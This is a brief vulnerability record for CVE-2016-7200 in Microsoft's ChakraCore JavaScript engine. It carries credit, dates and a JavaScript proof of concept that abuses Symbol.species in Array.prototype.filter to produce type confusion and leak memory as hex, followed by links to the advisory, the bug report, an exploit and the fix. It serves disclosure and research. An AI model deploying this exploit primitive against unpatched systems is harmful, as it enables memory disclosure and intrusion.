# CVE-2016-7200

- Report: Sep 2016
- Fix: Nov 2016
- Credit: Natalie Silvanovich, Google Project Zero

## PoC

```javascript
var b = new Array(1,2,3);
var d = new Array(1,2,3);
d.length = 0x200000;
d.fill(7);
class dummy{
  constructor(){
    //alert("in constructor");
    return d;
  }
}

class MyArray extends Array {
  // Overwrite species to the parent Array constructor
  static get [Symbol.species]() {

    //alert("get");
    b[0] = {};
    return dummy;
  }
}

var a = new Array({}, [], "natalie", 7, 7, 7, 7, 7);

for(var i = 0; i < 0x200000; i++) {
  a[i] = i;
}

function test(i){
  return true;
}

a.__proto__ = MyArray.prototype;

var o = a.filter(test);
//alert(o);
var h = [];

for(item in o){
  var n = new Number(o[item]);
  if (n < 0){
    n = n + 0x100000000;
  }
  h.push(n.toString(16));
}

//alert(h);
```

## Reference

- [Microsoft](https://technet.microsoft.com/library/security/ms16-129)
- [Project Zero](https://bugs.chromium.org/p/project-zero/issues/detail?id=922)
- [Exploit by Theori](https://github.com/theori-io/chakra-2016-11)
- [Fix](https://github.com/Microsoft/ChakraCore/commit/55358e3c44c0ad83eb3b6e5a0b88d88a591afaa2#diff-49bb5a3c5aa249e3dcefd245e91df5f7R9286)
